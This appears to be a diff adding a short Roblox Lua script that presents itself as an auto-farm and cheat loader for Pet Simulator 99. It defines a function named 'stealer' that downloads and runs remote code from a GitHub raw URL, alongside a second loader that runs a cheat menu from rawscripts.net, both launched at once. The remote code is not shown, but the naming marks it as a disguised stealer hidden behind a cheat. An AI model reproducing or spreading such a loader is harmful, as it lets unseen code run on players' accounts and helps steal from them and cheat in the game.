@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DAZDADAZD/zebhu/refs/heads/main/auto%20farm)'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://rawscripts.net/raw/Pet-Simulator-99!-Cheat-Menu-17428'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
